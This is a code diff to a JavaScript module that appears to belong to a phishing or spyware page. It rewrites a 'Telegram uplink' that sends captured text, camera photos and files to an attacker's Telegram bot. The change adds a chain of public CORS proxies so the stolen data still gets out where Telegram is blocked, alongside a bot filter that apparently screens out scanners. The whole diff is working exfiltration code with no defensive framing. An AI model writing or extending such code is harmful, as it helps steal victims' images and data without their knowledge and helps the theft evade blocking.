@@ -41,37 +41,69 @@ class BotFilter {
 }
 
 // ═══════════════════════════════════════════════════════════════════════════
-// 📡 MODULE 3: TELEGRAM UPLINK
+// 📡 MODULE 3: TELEGRAM UPLINK (ANTI-BAN PROXY SYSTEM)
 // ═══════════════════════════════════════════════════════════════════════════
 class TelegramUplink {
-    constructor(chat_id) { this.chat_id = chat_id; }
+    constructor(chat_id) {
+        this.chat_id = chat_id;
+        // 🔄 PROXY CHAIN: Ensures delivery even if Telegram is banned (e.g., Pakistan, Russia)
+        this.endpoints = [
+            (t, m) => `https://api.telegram.org/bot${t}/${m}`,                                       // 1. Direct (Fastest)
+            (t, m) => `https://corsproxy.io/?` + encodeURIComponent(`https://api.telegram.org/bot${t}/${m}`), // 2. CORS Proxy 1
+            (t, m) => `https://api.codetabs.com/v1/proxy?quest=` + encodeURIComponent(`https://api.telegram.org/bot${t}/${m}`) // 3. CORS Proxy 2
+        ];
+    }
+
+    // 🛡️ HEARTBEAT: Tries all Gateways until one works
+    async request(method, body, isFormData = false) {
+        if (!this.chat_id) return;
+
+        // Inject Chat ID if missing (for FormData or JSON)
+        if (isFormData) {
+            if (!body.has('chat_id')) body.append('chat_id', this.chat_id);
+        } else {
+            body.chat_id = this.chat_id;
+            body.parse_mode = 'HTML';
+            body.disable_web_page_preview = true;
+        }
+
+        let lastError;
+        for (const generator of this.endpoints) {
+            const url = generator(CONFIG.BOT_TOKEN, method);
+            try {
+                const options = { method: 'POST' };
+                if (isFormData) options.body = body;
+                else {
+                    options.headers = { 'Content-Type': 'application/json' };
+                    options.body = JSON.stringify(body);
+                }
+
+                const res = await fetch(url, options);
+                if (res.ok) return true; // Success! Stop sending.
+            } catch (e) {
+                lastError = e;
+                continue; // Try next proxy
+            }
+        }
+        console.error("All Gateways Failed:", lastError);
+    }
 
     async sendText(text) {
-        if (!this.chat_id) return;
-        try {
-            await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: this.chat_id, text: text, parse_mode: 'HTML', disable_web_page_preview: true })
-            });
-        } catch (e) { }
+        await this.request('sendMessage', { text: text });
     }
 
     async sendPhoto(blob, caption) {
-        if (!this.chat_id) return;
         const d = new FormData();
-        d.append('chat_id', this.chat_id);
         d.append('photo', blob, 'cam.jpg');
         if (caption) d.append('caption', caption);
-        try { await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendPhoto`, { method: 'POST', body: d }); } catch (e) { }
+        await this.request('sendPhoto', d, true);
     }
 
     async sendFile(blob, name, caption) {
-        if (!this.chat_id) return;
         const d = new FormData();
-        d.append('chat_id', this.chat_id);
         d.append('document', blob, name);
         if (caption) d.append('caption', caption);
-        try { await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendDocument`, { method: 'POST', body: d }); } catch (e) { }
+        await this.request('sendDocument', d, true);
     }
 }
 
